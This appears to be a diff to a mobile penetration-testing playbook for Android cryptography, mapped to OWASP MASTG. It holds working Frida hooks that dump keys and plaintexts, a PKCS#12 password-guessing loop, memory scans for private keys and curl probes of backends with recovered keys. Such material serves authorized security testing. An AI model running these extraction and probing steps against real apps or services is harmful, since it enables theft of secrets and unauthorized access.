@@ -105,7 +105,7 @@ grep -oE 'android:(targetSdkVersion|minSdkVersion)="[0-9]+"' "$DEC/apktool/Andro
    table and one `SecretKeySpec` hook answer most of the domain in ten minutes, and the hook beats every
    obfuscator because the key must exist in the clear at construction.
 2. **Framework check before any negative** (D12-003). On React Native, Flutter, Cordova or Unity a clean
-   `jadx/sources` crypto grep is a *false negative*, not a result. Dump the bundle or the native blob first.
+   `$DEC/jadx/sources` crypto grep is a *false negative*, not a result. Dump the bundle or the native blob first.
 3. **Key provenance, hardest first** (D12-005 → D12-013). Hardcoded constant → shipped key file → native
    blob → device-identifier derivation → outside-the-Keystore storage. Stop at the first one that decrypts
    real data; that is the report.
@@ -124,6 +124,13 @@ grep -oE 'android:(targetSdkVersion|minSdkVersion)="[0-9]+"' "$DEC/apktool/Andro
 
 ## Items
 
+`$DEC` = `$E/decompiled` (START.md §6): `$DEC/jadx/sources`, `$DEC/apktool/{smali*,res,assets,lib,AndroidManifest.xml}`; the DEX
+extracted once (`mkdir -p $DEC/dex && unzip -o "$APK" 'classes*.dex' -d $DEC/dex`); cross-platform dumps under `$DEC/<framework>/`
+(`$DEC/il2cpp/dump.cs`, `$DEC/xamarin/assemblies`, `$DEC/blutter`). `MASTG_RULES` is defined in D12-001. Device reads use
+`PKG=com.target.app` and `AS="su 0 sh -c"` (rooted harness; `run-as` is refused for a non-debuggable production APK —
+`AS="run-as $PKG sh -c"` only for a debuggable repack), written `adb shell "$AS '<device command>'"`: the outer double quotes
+survive the host shell and the inner single quotes reach the device shell; an unquoted `sh -c cat` reads stdin and hangs.
+
 ### D12-001 · Build the transformation and key-provenance census before judging anything
 
 | | |
@@ -132,6 +139,7 @@ grep -oE 'android:(targetSdkVersion|minSdkVersion)="[0-9]+"' "$DEC/apktool/Andro
 | **VRT** | n/a (method — feeds every item below) |
 | **Attacker** | AM-12 (harness) |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASTG-KNOW-0011, MASTG-KNOW-0012, MASTG-KNOW-0013 |
 
 - **Test:** Produce one frequency-ordered table of every cipher transformation, every digest, every key
@@ -139,7 +147,7 @@ grep -oE 'android:(targetSdkVersion|minSdkVersion)="[0-9]+"' "$DEC/apktool/Andro
   actual crypto rather than against whatever grep hit first.
 - **How:**
 ```bash
-J=out/sources
+J=$DEC/jadx/sources
 # 1. transformation census, frequency ordered — the single most informative artefact in the domain
 grep -rhoE 'Cipher\.getInstance\("[^"]+"' $J | sort | uniq -c | sort -rn
 grep -rhoE 'MessageDigest\.getInstance\("[^"]+"' $J | sort | uniq -c | sort -rn
@@ -151,19 +159,18 @@ grep -rnE 'new SecretKeySpec\(|new IvParameterSpec\(|new GCMParameterSpec\(|new 
 # 3. randomness sources
 grep -rnE 'new Random\(|Math\.random\(|java\.util\.Random|SecureRandom|setSeed\(|currentTimeMillis\(\)|nanoTime\(\)' $J
 # 4. the smali cross-check (catches what jadx failed to decompile)
-grep -rnE 'Ljavax/crypto/Cipher;->getInstance|Ljavax/crypto/spec/SecretKeySpec;-><init>|Ljava/security/MessageDigest;->getInstance' out/smali/ | wc -l
+grep -rnE 'Ljavax/crypto/Cipher;->getInstance|Ljavax/crypto/spec/SecretKeySpec;-><init>|Ljava/security/MessageDigest;->getInstance' $DEC/apktool/smali*/ | wc -l
 ```
   Run the MASTG semgrep rule pack over the same tree so the static result is citable:
 ```bash
-semgrep -c rules/mastg-android-broken-encryption-algorithms.yaml \
-        -c rules/mastg-android-broken-encryption-modes.yaml \
-        -c rules/mastg-android-hardcoded-crypto-keys-usage.yml \
-        -c rules/mastg-android-random-apis-insufficient-entropy.yml \
-        -c rules/mastg-android-non-random-use.yml \
-        -c rules/mastg-android-key-generation-with-insufficient-key-length.yml \
-        -c rules/mastg-android-asymmetric-key-pair-used-for-multiple-purposes.yml \
-        -c rules/mastg-android-hardcoded-security-provider.yaml $J
-mobsfscan --json -o mobsfscan.json $J
+MASTG_RULES=${MASTG_RULES:-$HOME/.refs/mastg/rules}      # clone of OWASP/mastg; holds the mastg-android-* pack every semgrep line below names
+printf 'class T{ void f(){ javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding"); } }' > "$E/logs/_sane_control.java"   # planted positive control
+semgrep --no-git-ignore --metrics=off -c "$MASTG_RULES" --include '*.java' --include '*.kt' \
+        "$J" "$E/logs/_sane_control.java" --json -o "$E/logs/D12-001-semgrep.json"
+# --no-git-ignore is NOT optional: semgrep silently limits the scan to git-tracked files, a gitignored decompiled tree scans ONE file, and it exits 0
+jq '.results|length' "$E/logs/D12-001-semgrep.json"          # must be >= 1 (the planted control) before any negative counts; also check .paths.scanned covers the tree
+# mobsfscan: per top-level package directory — on a 40k-file tree it dies silently with no JSON and empty stderr, which is a crash, not a clean result
+for d in "$J"/*/; do mobsfscan --json -o "$E/logs/D12-001-mobsf-$(basename "$d").json" "$d" || echo "mobsfscan FAILED on $d"; done
 ```
 - **Proof:** A table of transformations with counts and file:line anchors, plus a count of smali crypto
   call sites that matches the jadx count within a few percent. A large smali/jadx delta means decompilation
@@ -182,7 +189,8 @@ mobsfscan --json -o mobsfscan.json $J
 | **VRT** | n/a (method) |
 | **Attacker** | AM-12 (harness) |
 | **Applies to** | all Java/Kotlin crypto; native crypto needs `Interceptor.attach` instead |
-| **Maps to** | MASTG-TOOL-0032, MASTG-TECH-0033, MASTG-TECH-0043; Frida CodeShare `@fadeevab/intercept-android-apk-crypto-operations`, `@dzonerzy/aesinfo` |
+| **Requires** | frida, device |
+| **Maps to** | MASTG-TOOL-0032, MASTG-TECH-0033, MASTG-TECH-0043, MASTG-DEMO-0106 (`Cipher.doFinal` via Frida); Frida CodeShare `@fadeevab/intercept-android-apk-crypto-operations`, `@dzonerzy/aesinfo` |
 
 - **Test:** Do not reverse the key derivation. The key must exist in the clear at `SecretKeySpec.<init>`
   and the plaintext must exist in the clear at `Cipher.doFinal`, whatever the obfuscator did. Capture both.
@@ -194,10 +202,11 @@ Java.perform(function () {
   function asc(b){ return Array.from(b).map(function(x){return String.fromCharCode(x&0xff);}).join(''); }
   var ST = function(){ return Java.use('android.util.Log').getStackTraceString(Java.use('java.lang.Exception').$new()); };
 
-  Java.use('javax.crypto.spec.SecretKeySpec').$init.overload('[B','java.lang.String')
-    .implementation = function (k, a) {
-      console.log('[KEY] alg=' + a + ' len=' + k.length + ' hex=' + hex(k) + ' ascii=' + asc(k) + '\n' + ST());
-      return this.$init(k, a); };
+  var SKS = Java.use('javax.crypto.spec.SecretKeySpec');          // both constructors: (byte[],String) and (byte[],int,int,String) — the 4-arg form slices a key out of a larger buffer
+  SKS.$init.overloads.forEach(function (o) { o.implementation = function () {
+    var k = arguments[0], a = arguments[arguments.length - 1], off = arguments.length === 4 ? arguments[1] : 0, len = arguments.length === 4 ? arguments[2] : k.length;
+    var kb = Array.prototype.slice.call(k, off, off + len);
+    console.log('[KEY] alg=' + a + ' len=' + len + ' hex=' + hex(kb) + ' ascii=' + asc(kb) + '\n' + ST()); return o.apply(this, arguments); }; });
 
   Java.use('javax.crypto.spec.IvParameterSpec').$init.overload('[B')
     .implementation = function (iv) { console.log('[IV] ' + hex(iv)); return this.$init(iv); };
@@ -206,9 +215,9 @@ Java.perform(function () {
   G.$init.overload('int','[B').implementation = function (t, iv) {
     console.log('[GCM] tagBits=' + t + ' ivLen=' + iv.length + ' iv=' + hex(iv)); return this.$init(t, iv); };
 
-  var C = Java.use('javax.crypto.Cipher');
-  C.getInstance.overload('java.lang.String').implementation = function (t) {
-    console.log('[CIPHER] ' + t + '\n' + ST()); return this.getInstance(t); };
+  var C = Java.use('javax.crypto.Cipher');                        // all three getInstance forms: (String), (String,String provider), (String,Provider)
+  C.getInstance.overloads.forEach(function (o) { o.implementation = function () {
+    console.log('[CIPHER] ' + arguments[0] + (arguments.length > 1 ? ' provider=' + arguments[1] : '') + '\n' + ST()); return o.apply(this, arguments); }; });
   C.doFinal.overloads.forEach(function (o) {
     o.implementation = function () {
       var r = o.apply(this, arguments);
@@ -219,14 +228,16 @@ Java.perform(function () {
 });
 ```
 ```bash
-frida -D "$SERIAL" -f com.target.app -l crypto.js
+SERIAL=${SERIAL:-$(adb devices | awk 'NR>1 && $2=="device"{print $1; exit}')}
+frida -D "$SERIAL" -f com.target.app -l crypto.js                 # frida-tools 17: spawn resumes by default (--pause is the opt-in; the old no-pause flag was removed)
+frida -D "$SERIAL" -q -t 120 -f com.target.app -l crypto.js | tee "$E/logs/D12-002-crypto.log"   # quiet mode MUST carry -t or it detaches right after load and every hook shows zero hits
 # broad trace first if you do not know where to look
-frida-trace -U -f com.target.app -j 'javax.crypto.*!*' -j 'java.security.*!*' -o crypto.log
+frida-trace -D "$SERIAL" -f com.target.app -j 'javax.crypto.*!*' -j 'java.security.*!*' -o crypto.log
 ```
 - **Proof:** A `[KEY]` line with the hex bytes and a `[CIPHER]` line naming the transformation, followed by
   a `[DOFINAL]` line showing the corresponding plaintext. The MHL-captured shape is the target:
   `Algorithm: AES/ECB/PKCS5Padding`, `Key: 4d6f62696c65486173682e2e2e`, `Input: {"user":"admin","pin":"1234"}` —
-  two findings (recovered key, ECB mode) out of one trace.
+  two findings (recovered key, ECB mode) out of one trace. A `provider=` suffix on a `[CIPHER]` line feeds D12-070.
 - **Escalation:** The key feeds D12-005; the plaintext feeds D11 (decrypt the local store) and D15 (forge
   the request body). A recovered request-signing key is the highest-value exit from this item.
 - **Ruled out when:** Hooks are installed (prove it with a control line printed at attach) and exercising
@@ -246,29 +257,33 @@ frida-trace -U -f com.target.app -j 'javax.crypto.*!*' -j 'java.security.*!*' -o
 | **Maps to** | MASTG-TOOL-0116 (blutter), MASTG-TOOL-0125 (apkleaks), MASTG-TOOL-0144 (gitleaks) |
 
 - **Test:** On cross-platform builds the key derivation, the storage-key names and the transformation live
-  in `assets/index.android.bundle` (or the OTA bundle), `libapp.so`, `libil2cpp.so` or the managed
-  assemblies — never in `jadx/sources`. Establish the framework before recording any crypto negative.
+  in `$DEC/apktool/assets/index.android.bundle` (or the OTA bundle), `libapp.so`, `libil2cpp.so` or the managed
+  assemblies — never in `$DEC/jadx/sources`. Establish the framework before recording any crypto negative.
 - **How:**
 ```bash
 unzip -l base.apk | grep -iE 'index.android.bundle|libhermes|libapp\.so|libflutter\.so|libil2cpp\.so|assemblies|global-metadata|www/|cordova'
 # React Native / Hermes
-hbctool disasm assets/index.android.bundle hbc_out 2>/dev/null || strings -n 6 assets/index.android.bundle > hbc.strings
+HBC=$(python3 -c "import struct,sys; f=open(sys.argv[1],'rb'); f.seek(8); print(struct.unpack('<I', f.read(4))[0])" $DEC/apktool/assets/index.android.bundle 2>/dev/null); echo "Hermes bytecode v$HBC"
+# pick the tool by version (D01-026): hbctool stops in the v7x range; RN 0.72+ ships v9x -> hermes-dec (hbc-disassembler / hbc-decompiler); strings is the floor, not the method
+hbc-decompiler $DEC/apktool/assets/index.android.bundle hbc_out.js 2>/dev/null || hbctool disasm $DEC/apktool/assets/index.android.bundle hbc_out 2>/dev/null || { echo "NO DISASSEMBLER FOR v$HBC — string table only (record the item as partial)"; }
+strings -n 6 $DEC/apktool/assets/index.android.bundle > hbc.strings
 grep -aiE 'SecureStore|AsyncStorage|keychain|accessToken|refresh|biometric|mmkv|encrypt|aes|hmac|secret' hbc.strings | head -40
 # Flutter
-python3 blutter.py ext/lib/arm64-v8a out_dir && grep -nE 'aes|sha256|hmac|encrypt|IV|salt|Cipher' out_dir/pp.txt | head -40
-strings -n 20 ext/lib/arm64-v8a/libapp.so | grep -a -- '-----BEGIN'
+python3 blutter.py $DEC/apktool/lib/arm64-v8a $DEC/blutter && grep -nE 'aes|sha256|hmac|encrypt|IV|salt|Cipher' $DEC/blutter/pp.txt | head -40
+strings -n 20 $DEC/apktool/lib/arm64-v8a/libapp.so | grep -a -- '-----BEGIN'
 # Unity / Xamarin
-grep -nE 'Aes|Rijndael|TripleDES|MD5|SHA1|Rfc2898DeriveBytes|new byte\[\]|Convert\.FromBase64String' out/dump.cs | head -40
-ilspycmd out/assemblies/out/App.dll | grep -nE 'Aes|key|IV|Rfc2898' | head -40
+grep -nE 'Aes|Rijndael|TripleDES|MD5|SHA1|Rfc2898DeriveBytes|new byte\[\]|Convert\.FromBase64String' $DEC/il2cpp/dump.cs | head -40
+ilspycmd $DEC/xamarin/assemblies/out/App.dll | grep -nE 'Aes|key|IV|Rfc2898' | head -40
 ```
 - **Proof:** Storage-key names, route strings or crypto identifiers recovered from the bundle/native string
-  table that do not appear anywhere in `jadx/sources` — one Hermes v96 bundle yielded 545k strings including
+  table that do not appear anywhere in `$DEC/jadx/sources` — one Hermes v96 bundle yielded 545k strings including
   every route, endpoint and storage key.
 - **Escalation:** Whatever you find routes to D12-009 (Flutter Smi keys), D12-010 (managed code),
   D12-011 (bundle keys) and D19.
 - **Ruled out when:** The APK contains none of the framework markers above (no `index.android.bundle`, no
   `libapp.so`/`libflutter.so`, no `libil2cpp.so`/`global-metadata.dat`, no `assemblies/`, no `www/`), so the
-  DEX is the whole app and a DEX-only negative is sound.
+  DEX is the whole app and a DEX-only negative is sound. A string-table-only pass (no disassembler for the bytecode
+  version) is recorded as *partial*, never as a negative.
 
 ### D12-004 · Enumerate the Keystore at runtime and read every key's real `KeyInfo`
 
@@ -278,17 +293,18 @@ ilspycmd out/assemblies/out/App.dll | grep -nE 'Aes|key|IV|Rfc2898' | head -40
 | **VRT** | n/a (method — the measurement behind D12-048 → D12-061) |
 | **Attacker** | AM-12 (harness) |
 | **Applies to** | API 23+ for `KeyInfo`/`KeyGenParameterSpec`; `getSecurityLevel()` API 31+ |
+| **Requires** | frida, device |
 | **Maps to** | MASTG-KNOW-0043 (Android KeyStore), MASTG-KNOW-0047, MASTG-TEST-0330; objection `android keystore list` / `detail` / `watch` |
 
 - **Test:** "We use the Android Keystore" is a claim. This is the measurement: which aliases exist, what
   each one is for, and what its authorisation constraints actually are.
 - **How:**
 ```bash
-objection -g com.target.app explore -s "android keystore list"
-objection -g com.target.app explore -s "android keystore detail --json"   # getKeySize, getKeyValidityForConsumptionEnd,
+objection -S "$SERIAL" -g com.target.app explore -s "android keystore list"
+objection -S "$SERIAL" -g com.target.app explore -s "android keystore detail --json"   # getKeySize, getKeyValidityForConsumptionEnd,
                                                                           # getKeyValidityForOriginationEnd, getKeyValidityStart,
                                                                           # getKeystoreAlias, isInsideSecureHardware
-objection -g com.target.app explore -s "android keystore watch"           # hooks KeyStore.getKey and KeyStore.load
+objection -S "$SERIAL" -g com.target.app explore -s "android keystore watch"           # hooks KeyStore.getKey and KeyStore.load
 ```
 ```javascript
 // keyinfo.js — the full property read, including the API 31+ security level
@@ -313,6 +329,7 @@ Java.perform(function () {
       try { line += ' | secureHW=' + info.isInsideSecureHardware(); } catch (e) {}
       try { line += ' | securityLevel=' + info.getSecurityLevel(); } catch (e) {}   // API 31+
       try { line += ' | unlockedDeviceRequired=' + info.isUnlockedDeviceRequired(); } catch (e) {}
+      try { line += ' | userAuthType=' + info.getUserAuthenticationType(); } catch (e) {}   // API 30+: 1=DEVICE_CREDENTIAL, 2=BIOMETRIC_STRONG, 3=either (D12-082)
       console.log(line);
     } catch (e) { console.log(a + ' | ERR ' + e); }
   }
@@ -320,16 +337,22 @@ Java.perform(function () {
 ```
   Static counterpart, so the two can be reconciled:
 ```bash
-grep -rn -A25 'KeyGenParameterSpec\.Builder' out/sources/ | \
+grep -rn -A25 'KeyGenParameterSpec\.Builder' $DEC/jadx/sources/ | \
   grep -E 'setUserAuthenticationRequired|setUserAuthenticationParameters|setUserAuthenticationValidityDurationSeconds|setInvalidatedByBiometricEnrollment|setUnlockedDeviceRequired|setIsStrongBoxBacked|setRandomizedEncryptionRequired|setBlockModes|setEncryptionPaddings|setKeySize|setAttestationChallenge|PURPOSE_'
 ```
-- **Proof:** A per-alias table with the eight properties above, reconciled against the
+- **Proof:** A per-alias table with the nine properties above (`authTimeout=-1` = per-operation; `userAuthType`
+  decides whether a PIN unlocks the key), reconciled against the
   `KeyGenParameterSpec.Builder` chain in the decompile, and each alias mapped to the secret it protects via
   the `android keystore watch` / `KeyStore.getKey` hook firing immediately before a `Cipher.doFinal`.
 - **Escalation:** Every Keystore item below cites a row from this table.
-- **Ruled out when:** `aliases()` returns empty after exercising every crypto-touching flow **and** the
-  static grep finds no `KeyGenParameterSpec`/`AndroidKeyStore` reference — the app does not use the
-  Keystore at all, which is itself the D12-013 finding, not a clean bill of health.
+- **Ruled out when:** `aliases()` returns empty after exercising every crypto-touching flow **and** the static grep
+  finds no `KeyGenParameterSpec`/`AndroidKeyStore` reference. Decide which of two states that is before recording:
+  **(a)** the app does its own crypto with no Keystore — that is the D12-013 finding, not a clean bill of health;
+  **(b)** the app is a thin client whose key use is brokered over binder to another package's UID (a platform-services
+  or sibling first-party package — see D11-074 and the D15 "requests originate elsewhere" branch). In state (b)
+  D12-048..D12-061 are **n/a for this APK**: mark them n/a naming the delegate, and record the delegate's alias count
+  only as context, measured in the delegate's own process with a positive control (one alias you already know exists
+  there). Never rate the delegate's key properties against this programme's scope unless the delegate is in scope.
 
 ### D12-005 · Hardcoded symmetric key reaching `SecretKeySpec`
 
@@ -339,21 +362,28 @@ grep -rn -A25 'KeyGenParameterSpec\.Builder' out/sources/ | \
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the key opens a backend asset; `insecure_os_firmware.hardcoded_password.non_privileged_user` (P2) for the embedded credential itself; `cryptographic_weakness.insecure_key_generation.insufficient_key_space` (P3) as the crypto-native fallback |
 | **Attacker** | AM-01 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASTG-TEST-0212, MASWE-0003, MASWE-0004, MASTG-KNOW-0012, rule `mastg-android-hardcoded-crypto-keys-usage`, CWE-312/318/321/798, ATT&CK T1406/T1521.001 |
 
 - **Test:** A key that is a compile-time constant is shared with every user and every attacker. The finding
   is not the constant; it is the ciphertext you decrypt with it.
 - **How:**
 ```bash
-semgrep -c rules/mastg-android-hardcoded-crypto-keys-usage.yml out/sources/
+semgrep --no-git-ignore --metrics=off -c "$MASTG_RULES"/mastg-android-hardcoded-crypto-keys-usage.yml "$DEC/jadx/sources"   # --no-git-ignore: a gitignored decompiled tree otherwise scans 1 file and exits 0 (D12-001)
 # the MASTG rule shape: SecretKeySpec $_ = new SecretKeySpec($KEY, $ALGO);  and  byte[] $KEY = {...}; ... new SecretKeySpec($KEY, $ALGO);
-grep -rnE 'new SecretKeySpec\(|SecretKeySpec\(\s*"|\.getBytes\(\s*"?(UTF-8|utf-8)?"?\s*\)' out/sources/ -B8 -A4
-grep -rnE 'new byte\[\] *\{ *(\(byte\) *)?(0x[0-9a-fA-F]{2}, *){7,}' out/sources/
-grep -rn --include='*.xml' -oE '[A-Za-z0-9+/]{24,}={0,2}' out/res/values/strings.xml
-strings classes*.dex | grep -E '^[A-Za-z0-9+/]{16,}={0,2}$' | head
-rabin2 -zz lib/arm64-v8a/*.so | grep -iE 'key|secret|passphrase'
-gitleaks detect --no-git --source ./out/
+grep -rnE 'new SecretKeySpec\(|SecretKeySpec\(\s*"|\.getBytes\(\s*"?(UTF-8|utf-8)?"?\s*\)' $DEC/jadx/sources/ -B8 -A4
+grep -rnE 'new byte\[\] *\{ *(\(byte\) *)?(0x[0-9a-fA-F]{2}, *){7,}' $DEC/jadx/sources/
+grep -rn --include='*.xml' -oE '[A-Za-z0-9+/]{24,}={0,2}' $DEC/apktool/res/values/strings.xml
+strings $DEC/dex/classes*.dex | grep -E '^[A-Za-z0-9+/]{16,}={0,2}$' | head
+rabin2 -zz $DEC/apktool/lib/arm64-v8a/*.so | grep -iE 'key|secret|passphrase'
+# the grep lines above are the PRIMARY sweep; scanners are secondary and each must pass a positive control first
+printf 'x="AIzaSyA%s"\n' "$(head -c 33 /dev/zero | tr '\0' A)" > "$E/logs/_control_key.txt"        # a 39-char AIza shape
+trufflehog filesystem --no-update --json "$DEC" "$E/logs/_control_key.txt" > "$E/logs/D12-005-trufflehog.json"
+grep -q AIzaSyA "$E/logs/D12-005-trufflehog.json" || echo 'scanner missed the control — its negatives are void'
+gitleaks dir "$DEC/jadx/sources" --no-banner -r "$E/logs/D12-005-gitleaks.json"   # ONE path per call (several paths silently scan 0 bytes); its gcp-api-key rule needs a delimiter after the key and misses >AIza…< in res/values/*.xml and the manifest — never cite it for XML
+# apkleaks decompiles the APK itself (15–20 min on a 200 MB base) and its JSON_Web_Token / Facebook_Secret_Key buckets are a public-suffix list and any 32-hex string: run it last, filter those buckets, and cross-check a key against the restriction probe (D18-009) instead of re-probing it
 apkleaks -f base.apk
+grep -rnoE 'Basic [A-Za-z0-9+/=]{12,}' "$DEC/jadx/sources" | while IFS=: read -r f l m; do printf '%s:%s %s\n' "$f" "$l" "$(printf '%s' "${m#Basic }" | base64 -d 2>/dev/null | tr -d '\n' | cut -c1-60)"; done   # HTTP Basic literals — no scanner rule covers them
 ```
   Confirm at runtime with D12-002, then decrypt off-device:
 ```bash
@@ -381,6 +411,7 @@ openssl enc -d -aes-128-ecb -K <hexkey> -in blob.bin | strings | head
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for a cloud service-account or an mTLS client identity; `insecure_os_firmware.hardcoded_password.privileged_user` (P1) if the store password grants privileged access |
 | **Attacker** | AM-01 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | ATT&CK T1474.001, T1635, T1521.002; MASWE-0004; CWE-798 |
 
 - **Test:** Anything shipped to every user is public. A client certificate, a PKCS#12 bundle, a keystore
@@ -389,10 +420,10 @@ openssl enc -d -aes-128-ecb -K <hexkey> -in blob.bin | strings | head
 ```bash
 unzip -l base.apk | grep -iE '\.p12$|\.pfx$|\.jks$|\.bks$|\.key$|\.pem$|\.keystore$|service-account|credentials\.json|\.der$'
 unzip -p base.apk res/raw/client.p12 > client.p12
-for pw in "" changeit password android "$(grep -rhoE 'char\[\] *\{[^}]*\}|"[A-Za-z0-9_!@#-]{6,32}"' out/sources/ | head -50)"; do
+for pw in "" changeit password android "$(grep -rhoE 'char\[\] *\{[^}]*\}|"[A-Za-z0-9_!@#-]{6,32}"' $DEC/jadx/sources/ | head -50)"; do
   openssl pkcs12 -info -nodes -in client.p12 -passin pass:"$pw" >/dev/null 2>&1 && echo "PASSWORD: [$pw]" && break
 done
-grep -rnE 'keyStore\.load\(|KeyStore\.getInstance\("(BKS|PKCS12|JKS)"\)|char\[\] *(password|storePassword)|\.toCharArray\(\)' out/sources/
+grep -rnE 'keyStore\.load\(|KeyStore\.getInstance\("(BKS|PKCS12|JKS)"\)|char\[\] *(password|storePassword)|\.toCharArray\(\)' $DEC/jadx/sources/
 # prove reach
 openssl pkcs12 -in client.p12 -out client.pem -nodes -passin pass:<pw>
 curl -v --cert client.pem https://mtls.api.target/v1/whoami
@@ -466,21 +497,21 @@ openssl pkcs12 -export -out client-cert.pfx -inkey privateKey.key -in cert.pem  
   runtime, because keys are often assembled at init rather than stored whole.
 - **How:**
 ```bash
-strings -n 20 ext/lib/arm64-v8a/libapp.so    | grep -a -n -- '-----BEGIN'
-strings -n 20 ext/lib/arm64-v8a/libil2cpp.so | grep -a -n -- '-----BEGIN'
-grep -rna -- '-----BEGIN' out/assemblies/out/*.dll
-grep -a -n -- '-----BEGIN' out_dir/pp.txt      # blutter object-pool dump
+strings -n 20 $DEC/apktool/lib/arm64-v8a/libapp.so    | grep -a -n -- '-----BEGIN'
+strings -n 20 $DEC/apktool/lib/arm64-v8a/libil2cpp.so | grep -a -n -- '-----BEGIN'
+grep -rna -- '-----BEGIN' $DEC/xamarin/assemblies/out/*.dll
+grep -a -n -- '-----BEGIN' $DEC/blutter/pp.txt      # blutter object-pool dump
 ```
 ```bash
-frida -D "$SERIAL" -f com.target.app -q -e "
+cat > scan.js <<'JS'
+// synchronous scan + NativePointer reads: Frida 17 removed the legacy Memory.read* forms, and an async Memory.scan under -q is cut off at exit
 var m = Process.getModuleByName('libapp.so');
-// '-----BEGIN'
-Memory.scan(m.base, m.size, '2d 2d 2d 2d 2d 42 45 47 49 4e', {
-  onMatch: function(a){ console.log(a, Memory.readUtf8String(a, 96)); }, onComplete: function(){}});
-// '/api/'
-Memory.scan(m.base, m.size, '2f 61 70 69 2f', {
-  onMatch: function(a){ console.log('api', a, Memory.readUtf8String(a, 80)); }, onComplete: function(){}});
-"
+[['-----BEGIN', '2d 2d 2d 2d 2d 42 45 47 49 4e'], ['/api/', '2f 61 70 69 2f']].forEach(function (p) {
+  Memory.scanSync(m.base, m.size, p[1]).forEach(function (r) { console.log(p[0], r.address, r.address.readUtf8String(96)); });
+});
+console.log('[scan complete] ' + m.name + ' base=' + m.base + ' size=' + m.size);   // the control line the Ruled-out-when demands
+JS
+frida -D "$SERIAL" -q -t 60 -f com.target.app -l scan.js      # -t: quiet mode detaches at load without it
 ```
 - **Proof:** A complete PEM private key extracted at a named offset, and a signature produced offline with
   it that the production API accepts (HTTP 200) — the signature replay is the finding, the PEM is the
@@ -507,13 +538,13 @@ Memory.scan(m.base, m.size, '2f 61 70 69 2f', {
   trivially.
 - **How:**
 ```bash
-python3 blutter.py ext/lib/arm64-v8a out_dir
-grep -nE 'LoadImmediate|#0x[0-9a-f]{2}\b' out_dir/asm/*.txt | head -60
+python3 blutter.py $DEC/apktool/lib/arm64-v8a $DEC/blutter
+grep -nE 'LoadImmediate|#0x[0-9a-f]{2}\b' $DEC/blutter/asm/*.txt | head -60
 python3 - <<'PY'
 raw = [0x82,0xE4,0xBA]          # the immediates in constructor order
 print(''.join(chr(b >> 1) for b in raw))
 PY
-grep -nE 'fromCharCodes|sha256|utf8|IV_SALT|AES|CBC|PKCS7|GCM' out_dir/asm/*.txt out_dir/pp.txt | head
+grep -nE 'fromCharCodes|sha256|utf8|IV_SALT|AES|CBC|PKCS7|GCM' $DEC/blutter/asm/*.txt $DEC/blutter/pp.txt | head
 ```
   Then reproduce the derivation off-device — the DroidPass shape was SHA-256(key) as the AES-256 key and
   SHA-256(key + `"IV_SALT"`)[:16] as the CBC IV, with AES-CBC/PKCS#7 confirmed from the object-pool mode
@@ -541,10 +572,12 @@ grep -nE 'fromCharCodes|sha256|utf8|IV_SALT|AES|CBC|PKCS7|GCM' out_dir/asm/*.txt
   a hardcoded-key finding in these stacks.
 - **How:**
 ```bash
-Il2CppDumper libil2cpp.so assets/bin/Data/Managed/Metadata/global-metadata.dat out/
-grep -nE 'Aes|Rijndael|TripleDES|MD5|SHA1|Rfc2898DeriveBytes|new byte\[\]|Convert\.FromBase64String|CipherMode\.ECB' out/dump.cs | head -60
-pyxamstore unpack -d out/assemblies assemblies.blob
-ilspycmd out/assemblies/out/App.dll | grep -nE 'Aes|key|IV|Rfc2898|CipherMode' | head -40
+Il2CppDumper $DEC/apktool/lib/arm64-v8a/libil2cpp.so $DEC/apktool/assets/bin/Data/Managed/Metadata/global-metadata.dat $DEC/il2cpp/
+grep -nE 'Aes|Rijndael|TripleDES|MD5|SHA1|Rfc2898DeriveBytes|new byte\[\]|Convert\.FromBase64String|CipherMode\.ECB' $DEC/il2cpp/dump.cs | head -60
+unzip -o "$APK" 'assemblies/*' 'lib/*/libassemblies.*.blob.so' -d "$DEC/xamarin" 2>/dev/null
+ls "$DEC/xamarin/assemblies" 2>/dev/null && pyxamstore unpack -d "$DEC/xamarin/assemblies"      # Xamarin / early MAUI: assemblies.blob + assemblies.manifest in that directory (no positional argument)
+ls "$DEC"/xamarin/lib/*/libassemblies.*.blob.so 2>/dev/null && echo 'MAUI .NET 9+ store-in-ELF layout: pyxamstore v1 cannot read it — use a v2 assembly-store reader (xamarin-android tools/) or treat the ELF with strings/rabin2 and record the item as partial'
+ilspycmd "$DEC"/xamarin/assemblies/out/*.dll | grep -nE 'Aes|key|IV|Rfc2898|CipherMode' | head -40
 ```
 - **Proof:** A literal key/IV byte array in the decompiled C#, and a successful offline decryption of the
   app's stored data with it.
@@ -569,8 +602,9 @@ ilspycmd out/assemblies/out/App.dll | grep -nE 'Aes|key|IV|Rfc2898|CipherMode' |
   string.
 - **How:**
 ```bash
-strings -n 8 assets/index.android.bundle > hbc.strings
-grep -aoE 'AIza[0-9A-Za-z_-]{35}'            hbc.strings | sort -u
+strings -n 8 $DEC/apktool/assets/index.android.bundle > hbc.strings
+printf 'AIzaSyA%s\n' "$(head -c 32 /dev/zero | tr '\0' A)" >> hbc.strings    # positive control: the sweep below must print it, or its negative is void
+grep -aoE 'AIza[0-9A-Za-z_-]{35}'            hbc.strings | sort -u    # 39 chars total — a key truncated to 35 returns API_KEY_INVALID and reads as dead when it is live
 grep -aoE '(sk|rk)_(live|test)_[0-9A-Za-z]{16,}' hbc.strings | sort -u
 grep -aoE 'AKIA[0-9A-Z]{16}'                 hbc.strings | sort -u
 grep -aiE 'admin.?key|master.?key|service.?account|algolia|sendgrid|twilio' hbc.strings
@@ -597,17 +631,19 @@ curl -s -H "X-Algolia-API-Key: <key>" -H "X-Algolia-Application-Id: <app>" \
 | **VRT** | `cryptographic_weakness.insecure_key_generation.insufficient_key_stretching` (varies — rate on the recovered plaintext); `cryptographic_weakness.insufficient_entropy.small_seed_space_in_prng` (P4) |
 | **Attacker** | AM-01 (with a device image or backup) / AM-03 (the identifier is often readable locally) |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | ATT&CK T1406, T1426, T1533; MASWE-0014, CWE-331/759/916 |
 
 - **Test:** A key derived from `ANDROID_ID`, IMEI, `Build.SERIAL`, the package name, the install time or
   a fixed salt plus a PIN is recoverable or brute-forceable off-device. It looks per-device and is not.
 - **How:**
 ```bash
